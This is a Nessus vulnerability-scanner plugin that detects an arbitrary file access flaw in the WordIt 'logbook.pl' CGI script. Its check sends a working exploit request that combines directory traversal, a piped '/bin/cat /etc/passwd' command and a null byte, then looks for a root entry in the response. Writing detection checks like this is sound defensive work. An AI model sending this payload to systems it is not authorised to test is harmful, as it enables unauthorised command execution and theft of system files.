#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11360);
 script_version ("$Revision: 1.19 $");
 script_bugtraq_id(7043);
 script_osvdb_id(15392);
 
 script_name(english:"Wordit Logbook logbook.pl file Parameter Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that suffers from an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The WordIt 'logbook.pl' CGI script is installed on the remote host. 

This script has a well-known security flaw that lets anyone read
arbitrary files on this host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/314275" );
 script_set_attribute(attribute:"solution", value:
"Remove the script." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/10");
 script_cvs_date("$Date: 2011/03/14 21:48:15 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks for the presence of logbook.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach d ( cgi_dirs() )
{
 w = http_send_recv3(method:"GET", item:string(d, "/logbook.pl?file=../../../../../../../../../../bin/cat%20/etc/passwd%00|"), port:port);
 if (isnull(w)) exit(1, "The web server did not answer");
 res = w[2];
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){
 	security_warning(port);
	exit(0);
	}	
}

